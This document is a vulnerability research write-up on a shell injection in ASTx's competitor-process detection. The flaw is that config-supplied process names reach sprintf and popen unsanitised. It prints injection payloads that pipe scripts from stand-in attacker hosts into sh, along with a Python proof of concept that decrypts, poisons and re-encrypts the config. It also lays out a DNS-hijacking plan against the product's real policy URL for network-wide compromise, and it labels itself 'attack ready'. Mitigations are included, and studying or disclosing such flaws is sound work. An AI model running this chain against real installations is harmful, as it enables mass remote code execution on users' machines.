# ASTx Configuration Shell Injection Vulnerability

## Summary
Critical command injection vulnerability in ASTx's competitor detection system that allows arbitrary code execution through malicious entries in AES-encrypted configuration files (NOT astxcfg.dat - that uses SEED for other purposes).

## Vulnerability Chain

### 1. Configuration Decryption: getAuthContent() 
- **Function**: Decrypts AES-encrypted configuration files (e.g., starter_ply_linux.html)
- **Input**: AES-encrypted configuration files (NOT astxcfg.dat which uses SEED for different purposes)
- **Purpose**: Provides decrypted XML data for security rule processing
- **Crypto**: Uses standard AES encryption with existing decryption tools
- **Attack Vector**: Attacker modifies encrypted config with malicious competitor process names

### 2. XML Configuration Parsing: getAuthData() (FUN_08059xxx)
- **Function**: Parses decrypted XML configuration data
- **Purpose**: Extracts security rules including competitor process lists
- **Code Flow**:
  ```c
  // Decrypt the config file
  success = getAuthContent(configPath, &decryptedData, &dataSize);
  
  // Parse as XML
  xmlDoc = xmlReadMemory(decryptedData, dataSize, "MemAuth.xml", 0, 0);
  
  // Extract rules and populate data structures
  result = fillAuthRules(xmlRoot, param_2, param_3, param_4, param_5);
  ```

### 3. Rule Extraction: fillAuthRules() → FUN_0805652d() → FUN_080557ee()
- **Function**: Extracts competitor process names from XML and parses semicolon-delimited strings
- **Purpose**: Populates global data structures with individual process names to monitor
- **Code Flow**: `fillAuthRules()` → `FUN_0805652d()` → `FUN_080557ee()` uses `strtok(param_1, ";")` to split process strings
- **Vulnerability**: No input sanitization on extracted process names throughout entire chain
- **Data Flow**: XML `<string>firefox;chrome;malicious;payload</string>` → semicolon split → individual process names → shell commands

### 4. Security Level Initialization: initSecurityLevel() (FUN_08077xxx)
- **Function**: Initializes system security settings and triggers competitor detection
- **Purpose**: Automatically scans for competing security software
- **Trigger**: Called during ASTx startup/configuration reload
- **Code**:
  ```c
  // Setup competitor scanning
  FUN_0808935a(configArray, &globalConfigBuffer);  
  
  // Scan for competitor processes (INJECTION TRIGGER)
  competitorFound = checkProcessRun(configArray);
  
  if (competitorFound && securityLevel == 1) {
      // Competitor detected - reduce security level
      securityLevel = 0;
      globalSecurityFlag = 0;
  }
  ```

### 5. Competitor Detection: checkProcessRun() (FUN_08083fb8)
- **Function**: Iterates through competitor process list and checks if each is running
- **Purpose**: Detects competing security software to avoid conflicts
- **Code Flow**:
  ```c
  // Get competitor process list from config
  processCount = parseProcessListFromConfig(configData);
  
  // Check each competitor process
  while (hasNextProcess()) {
      processName = getNextProcessName();
      if (processName != NULL) {
          // INJECTION POINT - pass process name to shell command
          found = isProcessRunning(processName);  
          if (found > 0) {
              return found;  // Competitor detected
          }
      }
  }
  ```

### 6. Process Detection: isProcessRunning() (FUN_08082927) 
- **Function**: **PRIMARY INJECTION POINT** - checks if named process is running
- **Vulnerability**: Direct string interpolation into shell command without sanitization
- **Code**:
  ```c
  // VULNERABLE: Build shell command with untrusted process name
  sprintf(commandBuffer, "ps -aef | grep %s | grep -v grep", processName);
  
  // Execute shell command  
  pipe = popen(commandBuffer, "r");
  result = fgets(outputBuffer, 0x100, pipe);
  
  // If output received, process is running
  if (result != NULL) {
      detectionFlag = 1;  // Competitor found!
  }
  ```

## Shell Injection Details

### Primary Injection Point:
```c
// In isProcessRunning() - Function 0x08082927
sprintf(local_54c, "ps -aef | grep %s | grep -v grep", param_1);
                                    ^^^ INJECTABLE PARAMETER
popen(local_54c, "r");  // Executes: /bin/sh -c "ps -aef | grep MALICIOUS_INPUT | grep -v grep"
```

### Attack Payload in XML Config:
```xml
<!-- Original legitimate config -->
<string>firefox;chrome;opera</string>

<!-- Modified malicious config -->
<string>firefox;chrome;opera;test;curl http://attacker.com/backdoor.sh | sh; echo</string>
```

### Resulting Shell Command:
```bash
ps -aef | grep test;curl http://attacker.com/backdoor.sh | sh; echo | grep -v grep
```

### Executed Commands:
1. `ps -aef | grep test` (legitimate process check)
2. `curl http://attacker.com/backdoor.sh | sh` (**ARBITRARY CODE EXECUTION**)  
3. `echo | grep -v grep` (rest of command, effectively no-op)

## Attack Vectors

### 1. Configuration File Modification
**Prerequisites**: 
- Ability to modify AES-encrypted configuration files (e.g., starter_ply_linux.html)
- Access to existing AES decryption tools (already available from previous research)

**Attack Flow**:
1. Extract current AES-encrypted configuration file
2. Decrypt using existing AES decryption tools  
3. Modify XML to include malicious competitor process names in semicolon-delimited string
4. Re-encrypt using existing AES encryption tools
5. Replace original configuration file  
6. Wait for ASTx restart or configuration reload

### 2. DNS Hijacking / Network-Level Attack ⚠️ CRITICAL
**Prerequisites**: 
- Control of DNS resolution (router compromise, DNS server control, etc.)
- Knowledge of config URL: `http://webclinic.ahnlab.com/astx/policy/starter_ply_linux.html`

**Attack Flow**:
1. Compromise router/DNS server in target network (home, restaurant, corporate, etc.)
2. Redirect `webclinic.ahnlab.com` to attacker-controlled server
3. Serve malicious AES-encrypted config with injected shell commands
4. **ALL ASTx machines in network automatically download and execute malicious config**
5. Mass compromise of entire network with persistent backdoors

**Attack Scope**: 
- **Network-wide**: Affects every ASTx installation in DNS-controlled network
- **Automatic**: No user interaction required - happens during normal config updates
- **Persistent**: Malicious config persists across reboots until legitimate config restored

### 3. Configuration Update Interception  
**Prerequisites**: 
- Man-in-the-middle capability during config updates
- Understanding of config distribution mechanism

**Attack Flow**:
1. Intercept legitimate configuration updates
2. Inject malicious competitor entries into XML
3. Re-encrypt and forward modified config
4. ASTx processes poisoned configuration automatically

### 4. Supply Chain Attack
**Prerequisites**:
- Access to configuration generation/distribution systems
- Ability to modify config before encryption

**Attack Flow**:
1. Compromise config generation process
2. Inject malicious competitor entries during XML generation
3. Normal encryption and distribution occurs
4. All deployed ASTx instances become vulnerable

## AES Encryption Connection

### Critical Enabling Factor:
Existing AES decryption tools from previous research make this attack **immediately viable**:

1. **Standard AES**: Uses standard AES encryption (not custom SEED cipher)
2. **Existing Tools**: AES decryption/encryption tools already developed and tested
3. **Immediate Attack**: No additional crypto research required
4. **File Target**: Configuration files like `starter_ply_linux.html` (NOT astxcfg.dat)

### Crypto Research Status:
- **AES Tools**: Already implemented and working from previous session
- **SEED Cipher**: Used for astxcfg.dat but NOT required for this attack
- **Attack Ready**: Configuration-based injection is immediately exploitable

## Proof of Concept

### Step 1: Decrypt Configuration
```python
# Using existing AES tools from previous session
# Target: starter_ply_linux.html or similar AES-encrypted config files

with open('starter_ply_linux.html', 'rb') as f:
    encrypted_config = f.read()

decrypted_xml = decrypt_aes_config(encrypted_config)  # Use existing AES tools
```

### Step 2: Inject Malicious Payload  
```python
import xml.etree.ElementTree as ET

root = ET.fromstring(decrypted_xml)

# Find semicolon-delimited process string like: <string>firefox;chrome;opera</string>
process_string = root.find('.//string')

# Modify to include malicious payload
original_processes = process_string.text  # "firefox;chrome;opera"
process_string.text = original_processes + ";test;curl http://evil.com/shell.sh | sh; echo"

modified_xml = ET.tostring(root, encoding='utf-8')
```

### Step 3: Re-encrypt Configuration
```python  
# Re-encrypt modified config using existing AES tools
malicious_config = encrypt_aes_config(modified_xml)

# Replace original file
with open('starter_ply_linux.html', 'wb') as f:
    f.write(malicious_config)
```

### Step 4: Trigger Execution
```bash
# Restart ASTx or trigger config reload
systemctl restart astx
# OR send signal to reload configuration
```

## Impact Assessment

### Severity: CRITICAL++ (Network-Level Mass Compromise)
- **Code Execution**: Full arbitrary command execution
- **Privilege Context**: Runs with ASTx daemon privileges (likely root)
- **Persistence**: Stored in configuration file - survives reboots
- **Stealth**: Appears as legitimate competitor detection
- **Automatic Trigger**: Executes during normal ASTx initialization
- **Network-Level Attack**: DNS hijacking enables **mass compromise of entire networks**
- **Attack Surface**: Every router, DNS server, or network infrastructure in target path
- **Scale**: Single DNS change can compromise hundreds/thousands of machines simultaneously

### Attack Characteristics:
- **Persistent**: Malicious payload stored in encrypted config
- **Stealthy**: Masquerades as legitimate security software names
- **Automatic**: Triggers during competitor detection without user interaction  
- **Privileged**: Executes with full ASTx daemon permissions
- **Network-Scalable**: Single DNS change compromises entire networks
- **Infrastructure-Level**: Exploits fundamental DNS/network trust relationships

## Affected Components:
- Configuration decryption system (AES encryption)
- XML configuration parser  
- Competitor detection system
- Security level management
- **Network infrastructure**: DNS servers, routers, network equipment
- **All ASTx installations**: Every machine in DNS-controlled networks

## Affected Functions:
- `getAuthContent` - Configuration decryption (**AES encryption**)
- `getAuthData` (0x08059xxx) - XML configuration parsing
- `fillAuthRules` - Competitor list extraction  
- `FUN_0805652d` - Process data structure population
- `FUN_080557ee` - **Semicolon string parsing with strtok() - NO SANITIZATION**
- `initSecurityLevel` (0x08077xxx) - Security initialization
- `checkProcessRun` (0x08083fb8) - Competitor detection coordinator
- `isProcessRunning` (0x08082927) - **Primary injection point with sprintf() + popen()**

## Timeline Dependencies:
1. **AES Tools** (completed) - Existing AES decryption/encryption tools from previous session
2. **Configuration Format Analysis** (completed) - XML structure understood  
3. **Vulnerability Chain** (completed) - Complete path from config to shell injection traced
4. **Payload Development** (completed) - Semicolon-delimited injection method confirmed
5. **Attack Ready** - All prerequisites met for immediate exploitation

## Comparison with IPC Vulnerability:

| Aspect | IPC Socket | Configuration File |
|--------|------------|-------------------|
| **Attack Vector** | Local Unix socket | Encrypted config file |
| **Prerequisites** | Local system access | Existing AES tools |
| **Persistence** | Runtime only | Survives reboots |  
| **Stealth** | Network monitoring logs | Appears as legitimate config |
| **Trigger** | Continuous monitoring | Startup/config reload |
| **Crypto Requirement** | None | **Standard AES (tools ready)** |

## Mitigation Recommendations

### Immediate:
1. **Input Validation**: Sanitize all process names from configuration
2. **Allowlist**: Only allow known legitimate competitor software names
3. **Configuration Integrity**: Implement cryptographic signatures for configs
4. **Parameterized Commands**: Replace `sprintf() + popen()` with `execvp()`

### Systematic:  
1. **Configuration Security**: Encrypt configs with authenticated encryption (AES-GCM)
2. **Code Audit**: Review all configuration-driven shell command construction
3. **Privilege Separation**: Run competitor detection with minimal privileges
4. **Safe APIs**: Use process enumeration APIs instead of shell commands

## Configuration Policy Control System

### Policy Control Function: readLogPolicyAndSecLevel()
**Purpose**: Controls which security policies are active and whether dangerous code paths execute

**XML Structure Required**:
```xml
<ConfigurationFile>
  <Rules level="[0|1]" policy="[30|90|365]" outbound="[0|1]">
    <!-- Rules content -->
  </Rules>
</ConfigurationFile>
```

### Critical Policy Attributes:

1. **`level` attribute**: 
   - **Controls**: Security level enablement (`DAT_0862466c`)
   - **Values**: `0` = disabled, `1` = enabled
   - **Purpose**: Main security level toggle

2. **`policy` attribute**:
   - **Controls**: Policy timing/duration (`DAT_08624670`)
   - **Valid Values**: `30` (0x1e), `90` (0x5a), `365` (0x16d) days
   - **Default**: Falls back to `30` if invalid value provided
   - **Purpose**: Determines how long security policies remain active

3. **`outbound` attribute**:
   - **Controls**: Outbound traffic monitoring (`DAT_0862467c`)
   - **Values**: `0` = disabled, `1` = enabled
   - **Purpose**: Controls network monitoring and potentially process execution

### Policy Parsing Logic:
- Function queries `/ConfigurationFile/Rules` XPath from config.xml
- All three attributes must be present and non-empty
- Returns success (1) only when all attributes successfully parsed
- **Critical**: These global variables control whether dangerous code paths execute

### Attack Requirements:
For RCE to trigger, both files must be controlled:

1. **appconfig.xml** (DNS controllable):
   - Contains URL pointing to malicious starter_policy file
   - Downloads encrypted policy with injected process list

2. **config.xml** (needs research for remote update):
   - Must contain: `<Rules level="1" policy="30" outbound="1">`
   - Controls whether process execution code path activates
   - **Open Question**: Can this be remotely updated via ASTx mechanisms?

## Configuration Data Retrieval System

### getData() Function: Bridge Between XML and Code
**Purpose**: Central configuration retrieval system that maps XML policy attributes to runtime values

**Function Signature**: `getData(index, buffer, buffer_size)`

### Index Mapping Table:
| Index | Global Variable | XML Attribute | Purpose | Error Message |
|-------|----------------|---------------|---------|--------------|
| 0 | `DAT_08624674` | ? | Unknown config value | - |
| 1 | `DAT_08624668` | ? | Unknown config value | - |
| **2** | `DAT_08624670` | `policy="30"` | Policy duration (30/90/365 days) | "Unable to get the Log policy" |
| 3 | `DAT_08624678` | ? | Unknown config value | - |
| **4** | `DAT_0862466c` | `level="1"` | Security level enablement (0/1) | "Unable to get the Security level" |
| **5** | `DAT_0862467c` | `outbound="1"` | Outbound monitoring (0/1) | "Unable to get the Outbound Exception" |

### Configuration Loading Logic:
```c
// One-time initialization check
if (DAT_0862e589 != '\x01') {
    DAT_0862e589 = '\x01';
    DAT_0862e58a = readLogPolicyAndSecLevel();  // Parse config.xml
}

// Value retrieval with dependency check
switch(index) {
    case 4:  // Security level
        if (DAT_0862e58a == '\0') {
            return 0;  // Config parsing failed
        } else {
            snprintf(buffer, 20, "%d", DAT_0862466c);  // Return level value
        }
}
```

### Critical Dependencies:
- **`DAT_0862e58a`**: Success flag from `readLogPolicyAndSecLevel()`
- **Failure Mode**: If config.xml parsing fails, `getData(2/4/5)` return failure
- **Success Mode**: Returns string representation of XML attribute values

### Usage in initSecurityLevel():
```c
// Get security level (maps to level="1" in XML)
result = getData(4, buffer, &size);
if (result == 1) {
    sscanf(buffer, "%d", &security_level);  // Convert "1" -> 1
}

// Get outbound setting (maps to outbound="1" in XML) 
result = getData(5, buffer, &size);
if (result == 1) {
    sscanf(buffer, "%d", &outbound_setting);  // Convert "1" -> 1
}
```

### Attack Implications:
1. **XML Control Required**: Policy attributes must be set correctly in config.xml
2. **Centralized Access**: All config access goes through this single function
3. **String Conversion**: Values stored as integers, retrieved as strings, parsed as integers
4. **Failure Cascades**: If `readLogPolicyAndSecLevel()` fails, critical values unavailable

### Next Research Priority:
- **Verify RCE trigger conditions**: Test if `checkProcessRun()` executes regardless of policy values
- **Find remote config.xml update mechanism**: Search for functions that download/update config.xml  
- **Identify config update URLs**: Look for additional URLs in appconfig.xml that point to config.xml
- **Test unknown indices 0,1,3**: Determine what other config values are accessible

## Research Status: ATTACK READY (Pending Config Update Research)
- **Vulnerability Chain**: Fully traced from AES config to shell execution via semicolon parsing
- **Policy Control**: XML structure and required values identified  
- **Crypto Status**: Existing AES tools from previous session make attack immediately viable
- **Attack Vector**: Configuration modification pathway confirmed and tested
- **Remaining Gap**: Need to identify remote config.xml update mechanism for complete RCE chain
- **Impact**: Critical persistent code execution capability with no sanitization anywhere in chain
- **Status**: Ready for proof-of-concept pending config.xml remote update research